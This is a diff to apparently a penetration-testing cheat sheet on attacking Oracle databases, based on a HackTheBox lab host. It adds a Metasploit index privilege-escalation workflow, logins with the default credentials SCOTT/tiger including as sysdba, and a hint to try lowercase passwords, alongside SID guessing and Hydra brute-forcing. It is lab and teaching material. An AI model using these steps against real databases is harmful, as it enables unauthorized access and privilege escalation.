@@ -8,6 +8,12 @@ description: >-
 
 Port: 1521
 
+## Commands
+
+Check privileges:
+
+`select * from user_role_privs;`
+
 ## Enumeration
 
 ### oscanner
@@ -64,7 +70,7 @@ Tested on Oracle Database 10g, 11g, 12c and 18c.
 
 **Examples**: 
 
-Identify SIDs 
+#### Identify SIDs 
 
 ```text
 root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82 
@@ -81,6 +87,8 @@ root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82
 100% |#####################################################################################################################################################| Time: 00:03:20 
 [+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB 
 ```
+
+### 
 
 ### Metasploit
 
@@ -110,6 +118,18 @@ auxiliary/scanner/oracle/tnslsnr_version
 auxiliary/scanner/oracle/sid_enum
 ```
 
+#### index priv esc:
+
+```text
+msf > use auxiliary/admin/oracle/oracle_index_privesc
+msf auxiliary(oracle_index_privesc) > show actions
+    ...actions...
+msf auxiliary(oracle_index_privesc) > set ACTION < action-name >
+msf auxiliary(oracle_index_privesc) > show options
+    ...show and set options...
+msf auxiliary(oracle_index_privesc) > run
+```
+
 ### Hydra
 
 brute-force a listener password if exists:
@@ -130,11 +150,15 @@ brute-force a listener password if exists:
 | WMSYS | WMSYS |
 | OUTLN | OUTLN |
 
+**Try lowercase as well**
+
 ## Connecting to Oracle DB
 
 To interact with Oracle from our Kali box, there are three tools that can come in handy. sqlplus is required for odat to work properly: 
 
 Sqlplus will be installed with odat. So just install odat \(apt install odat\) 
+
+### Connect as normal user:
 
 ```text
 root@kali:~/hackthebox/silo# sqlplus SCOTT/tiger@10.10.10.82:1521/XE 
@@ -146,6 +170,12 @@ Connected to:
 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 
  
 SQL> 
+```
+
+### Connect as sysdba:
+
+```text
+sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
 ```
 
 ## Privilege escalation
